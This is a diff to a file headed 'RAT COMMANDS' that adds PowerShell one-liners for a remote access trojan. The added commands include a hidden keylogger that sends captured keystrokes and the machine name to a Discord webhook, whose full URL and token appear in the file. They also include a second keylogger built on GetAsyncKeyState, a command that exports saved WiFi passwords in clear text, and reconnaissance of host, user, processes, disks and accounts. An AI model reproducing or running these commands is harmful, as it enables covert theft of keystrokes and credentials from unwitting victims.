@@ -1,16 +1,22 @@
 # ===================== RAT COMMANDS =====================
-# Keylogger với GetAsyncKeyState (đơn giản, reliable)
-powershell -nop -w hidden -exec bypass -c "$log='$env:TEMP\k.log';$h='YOUR_DISCORD_WEBHOOK_HERE';while(1){$o='';for($i=8;$i-le190;$i++){if([Windows.Input.Key]::IsKeyDown($i)){$o+=[char]$i;}};if($o){\"$(Get-Date -f 'HH:mm:ss') $o\"|Add-Content $log;};if(Test-Path $log){$c=gc $log -Tail 30;$b=@{content=\"[$($env:COMPUTERNAME)] Keys: $c\"}|ConvertTo-Json;try{irm $h -Method Post -Body $b -ContentType 'application/json'}catch{};ri $log -Force};sleep 5}"
+# Keylogger với GetAsyncKeyState (đã fix lỗi)
+powershell -nop -w hidden -exec bypass -c "$log='$env:TEMP\k.log';$h='https://discord.com/api/webhooks/1456532032522944669/Vjhe__tyv2859zCJKwPZbgDV5Vyjiozyj3kXTg5JufdC8rL2b__sZeIFr5Ro5iG9XygH';while(1){$o='';for($i=8;$i-le190;$i++){Add-Type -AssemblyName System.Windows.Forms;[void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');if([System.Windows.Forms.Control]::IsKeyLocked([System.Windows.Forms.Keys]::$i)){$o+=[char]$i;}};if($o){'['+(Get-Date -Format 'HH:mm:ss')+'] '+$o|Add-Content $log;};if(Test-Path $log){$c=Get-Content $log -Tail 30;$b=@{content='['+$env:COMPUTERNAME+'] Keys: '+$c}|ConvertTo-Json;try{Invoke-RestMethod -Uri $h -Method Post -Body $b -ContentType 'application/json'}catch{};Remove-Item $log -Force};Start-Sleep -Seconds 5}"
 
-# WiFi passwords extraction
-powershell -c "netsh wlan export profile key=clear folder='$env:TEMP\' && (Get-Content '$env:TEMP\*.xml' | Select-String 'keyMaterial' -Context 0,1) 2>$null"
+# Keylogger đơn giản hơn (GetAsyncKeyState method)
+powershell -nop -w hidden -c "Add-Type @'using System;using System.Runtime.InteropServices;public class K{[DllImport(\"user32.dll\")]public static extern short GetAsyncKeyState(int vKey);} '@;while(1){$o='';for($i=8;$i-le255;$i++){if(([K]::GetAsyncKeyState($i)-band0x8000)-ne0){$o+=[char]$i;}};if($o){'['+(Get-Date -f 'HH:mm:ss')+'] '+$o|Add-Content '$env:TEMP\keys.log';};Start-Sleep -Milliseconds 100}"
+
+# WiFi passwords (fixed escaping)
+powershell -c "netsh wlan export profile key=clear folder='$env:TEMP\' 2>$null; if(Test-Path '$env:TEMP\*.xml'){Select-String -Path '$env:TEMP\*.xml' -Pattern 'keyMaterial' -Context 0,1|ForEach-Object{$_.Context.PreContext[0]+'='+$_.Matches.Value};Remove-Item '$env:TEMP\*.xml' -Force}"
 
 # System information
-powershell -c "echo 'Host:';hostname;echo 'User:';whoami;echo 'IP:';ipconfig|findstr IPv4;echo 'OS:';systeminfo|findstr /B /C:'OS Name'"
+powershell -c "hostname; whoami; (ipconfig|findstr IPv4)[0]; (systeminfo|findstr /B /C:'OS Name')[0]"
 
-# Process list (suspicious)
-powershell -c "Get-Process | Where-Object {$_.ProcessName -match '(?i)task|svch|rund|reg|wmi'}|Select-Object Name,Id,Path|Format-Table"
+# Process list
+powershell -c "Get-Process|Where-Object{$_.ProcessName-match'task|svch|rund|reg|wmi'}|Select-Object Name,Id,Path|Format-Table -AutoSize"
 
-# Persistence check
-powershell -c "echo '=== STARTUP ===';Get-CimInstance Win32_StartupCommand|Select-Object Name,Command|ft;echo '=== SERVICES ===';Get-Service|Where-Object {$_.StartType -eq 'Auto'}|Select-Object Name,DisplayName|ft -AutoSize"
+# Disk info
+powershell -c "Get-WmiObject Win32_LogicalDisk|Where-Object{$_.DriveType-eq3}|Select-Object DeviceID,@{Name='SizeGB';Expression={[math]::Round($_.Size/1GB,2)}},@{Name='FreeGB';Expression={[math]::Round($_.FreeSpace/1GB,2)}}|Format-Table"
+
+# User accounts
+powershell -c "Get-WmiObject Win32_UserAccount|Where-Object{$_.LocalAccount -eq $true}|Select-Object Name,Disabled|Format-Table"
 # =======================================================
